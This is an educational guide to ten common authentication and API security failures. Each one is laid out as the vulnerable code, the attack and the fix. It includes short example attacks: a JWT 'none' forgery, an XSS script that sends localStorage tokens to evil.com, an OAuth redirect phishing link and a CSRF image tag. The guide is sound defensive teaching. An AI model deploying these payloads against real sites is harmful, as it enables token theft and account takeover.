# 08. Production Failures & Security Post-Mortems

> **Level:** Architect  
> **Focus:** "Learn from the mistakes of others."  
> **Warning:** Do not test these on production systems.

---

## 📖 Table of Contents
1.  [Introduction](#introduction)
2.  [Case Study 1: The JWT "None" Algorithm](#1-jwt-none-algorithm)
3.  [Case Study 2: The Infinite Token (Expiration Fail)](#2-infinite-token)
4.  [Case Study 3: The OAuth Open Redirect](#3-oauth-open-redirect)
5.  [Case Study 4: IDOR / BOLA (The #1 API Vuln)](#4-idor-bola)
6.  [Case Study 5: Mass Assignment (Role Escalation)](#5-mass-assignment)
7.  [Case Study 6: Leaking Tokens in Logs](#6-leaking-tokens)
8.  [Case Study 7: The "Stateless" Logout Fallacy](#7-stateless-logout)
9.  [Case Study 8: XSS vs LocalStorage](#8-xss-localstorage)
10. [Case Study 9: CSRF on GET Requests](#9-csrf-get)
11. [Case Study 10: Hardcoded Secrets in Git](#10-hardcoded-secrets)

---

<a name="introduction"></a>
## 1️⃣ Introduction

Theoretical security is easy. Practical security is hard.
This document analyzes **10 real-world patterns** that have caused data breaches in major companies. For each, we look at the Code, the Hack, and the Fix.

---

<a name="1-jwt-none-algorithm"></a>
## 2️⃣ Case Study 1: The JWT "None" Algorithm

**The Vulnerability:**
Several early JWT libraries allowed the `alg` header to be set to `none`. This meant "Unsecured JWT". If the server accepted this, it essentially skipped signature verification.

**The Hack:**
1.  Attacker logs in as `user`. Gets JWT: `header.payload.signature`.
2.  Attacker decodes header, changes `{"alg": "HS256"}` to `{"alg": "none"}`.
3.  Attacker decodes payload, changes `{"role": "user"}` to `{"role": "admin"}`.
4.  Attacker removes the signature (leave trailing dot: `header.payload.`).
5.  Attacker sends modified JWT. Server sees "none", skips verification, trusts "admin".

**The Fix:**
-   **Explicitly Disable 'None':** Use modern libraries (jjwt, Nimbus) that reject 'none' by default.
-   **Enforce Algorithm:** check `if (header.alg != 'RS256') throw new SecurityException();`.

---

<a name="2-infinite-token"></a>
## 3️⃣ Case Study 2: The Infinite Token

**The Vulnerability:**
Developer sets JWT expiration to 100 years (`exp: 9999999999`) to "avoid implementing refresh tokens".

**The Impact:**
An employee's laptop was stolen. The attacker extracted the token.
The company **could not revoke access**. The attacker had valid access forever. Changing passwords didn't help because the token was "stateless" and valid.

**The Fix:**
-   **Short-Lived Access Tokens:** Max 15-60 minutes.
-   **Revocable Refresh Tokens:** Store Refresh tokens in DB. When password changes, delete the Refresh Token.

---

<a name="3-oauth-open-redirect"></a>
## 4️⃣ Case Study 3: The OAuth Open Redirect

**The Vulnerability:**
The Authorization Server allowed wildcards in Redirect URIs: `https://myapp.com/*`.

**The Hack:**
1.  Attacker sends phishing link: `https://auth-server.com/authorize?client_id=myapp&redirect_uri=https://myapp.com/login?goto=http://evil.com`.
2.  User logs in.
3.  Auth Code is sent to `https://myapp.com/login...` which has an "Open Redirect" bug that forwards traffic to `http://evil.com`.
4.  The Auth Code leaks to `evil.com` via the Referrer header.

**The Fix:**
-   **Strict Matching:** No wildcards. `https://myapp.com/callback`. Exact match only.

---

<a name="4-idor-bola"></a>
## 5️⃣ Case Study 4: IDOR / BOLA (Broken Object Level Authorization)

**The Vulnerability:**
The API checks if you are logged in, but not if you own the data.
`GET /api/invoices/105` (My invoice) -> 200 OK.
`GET /api/invoices/106` (Your invoice) -> 200 OK.

**The Hack:**
Attacker writes a script to iterate ID from 1 to 1,000,000. Downloads entire database.

**The Fix:**
-   **Ownership Check:**
    ```java
    if (!invoice.getOwnerId().equals(currentUser.getId())) {
        throw new AccessDeniedException();
    }
    ```
-   **Use UUIDs:** Makes enumeration harder (but still need the check!).

---

<a name="5-mass-assignment"></a>
## 6️⃣ Case Study 5: Mass Assignment (Role Escalation)

**The Vulnerability:**
Using the User Entity directly in the Controller.
`public User updateProfile(@RequestBody User user)`

**The Hack:**
Attacker sends JSON:
```json
{
  "username": "alice",
  "role": "ADMIN" 
}
```
Spring Boot binds the JSON to the User object. The `role` field gets overwritten. User becomes Admin.

**The Fix:**
-   **Use DTOs (Data Transfer Objects):** `UpdateProfileRequest` should **only** contain `firstName`, `lastName`. NEVER `role` or `id`.

---

<a name="6-leaking-tokens"></a>
## 7️⃣ Case Study 6: Leaking Tokens in Logs

**The Vulnerability:**
`logger.info("Incoming request: {}", request.getHeaders());`

**The Impact:**
Logs are indexed in Splunk/ELK/Datadog. Developers, Support, and anyone with log access can see active Bearer tokens. If a dev account is compromised, all user accounts are compromised.

**The Fix:**
-   **Log Masking:** Configure logging framework to replace `Authorization` header value with `*****`.

---

<a name="7-stateless-logout"></a>
## 8️⃣ Case Study 7: The "Stateless" Logout Fallacy

**The Vulnerability:**
User clicks "Logout". Frontend deletes the JWT from LocalStorage.
**BUT** the token is still valid on the server until it expires.

**The Hack:**
Attacker stole the token *before* logout. User logs out thinking they are safe. Attacker keeps using the token.

**The Fix:**
-   **Token Blacklisting:** Ideally, store JTI in Redis on logout with TTL = remaining expiry time.
-   **Short Expiry:** Reduces the window of vulnerability.

---

<a name="8-xss-localstorage"></a>
## 9️⃣ Case Study 8: XSS vs LocalStorage

**The Vulnerability:**
Storing JWT in `localStorage`.
Site has a Cross-Site Scripting (XSS) bug (e.g., in a comment section).

**The Hack:**
Attacker posts comment: `<script>fetch('http://evil.com?token=' + localStorage.getItem('token'))</script>`.
Every user who views the comment sends their token to the attacker.

**The Fix:**
-   **HttpOnly Cookies:** Store tokens in `HttpOnly; Secure` cookies. JavaScript cannot read them.
-   **CSP (Content Security Policy):** Prevent execution of unauthorized scripts.

---

<a name="9-csrf-get"></a>
## 🔟 Case Study 9: CSRF on GET Requests

**The Vulnerability:**
Performing state changes via GET.
`GET /api/transfer?amount=1000&to=attacker`

**The Hack:**
Attacker sends an email with an invisible image: `<img src="http://bank.com/api/transfer?amount=1000&to=attacker" />`.
Browser loads the image, sending the cookies automatically. Money transferred.

**The Fix:**
-   **Verbs Matter:** GET must be read-only. Use POST/PUT for changes.
-   **CSRF Tokens:** Required for Session/Cookie based auth. (Not needed for Bearer Auth).

---

<a name="10-hardcoded-secrets"></a>
## 1️⃣1️⃣ Case Study 10: Hardcoded Secrets in Git

**The Vulnerability:**
`String CLIENT_SECRET = "12345-secret";` committed to GitHub.

**The Hack:**
Bots scan GitHub in real-time. AWS keys and Auth secrets are compromised within seconds of push.

**The Fix:**
-   **Environment Variables:** Use `@Value("${my.secret}")`.
-   **Vault / Secrets Manager:** AWS Secrets Manager, HashiCorp Vault.
-   **Git Hooks:** Use `git-secrets` or `trufflehog` to block commits containing secrets.

---
